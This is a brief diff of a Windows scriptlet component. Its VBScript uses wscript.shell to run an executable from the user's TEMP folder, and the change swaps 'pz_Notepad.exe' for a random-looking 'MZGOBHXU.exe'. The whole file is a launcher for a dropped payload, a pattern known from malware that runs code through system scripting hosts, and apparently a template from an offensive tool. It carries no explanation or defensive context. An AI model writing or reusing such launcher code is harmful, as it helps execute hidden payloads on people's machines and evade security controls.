@@ -1,6 +1,6 @@
 <component>
 <script language="VBScript">
 Set shell=CreateObject("wscript.shell")
-shell.Run(shell.ExpandEnvironmentStrings("%TEMP%") & "\pz_Notepad.exe")
+shell.Run(shell.ExpandEnvironmentStrings("%TEMP%") & "\MZGOBHXU.exe")
 </script>
 </component>
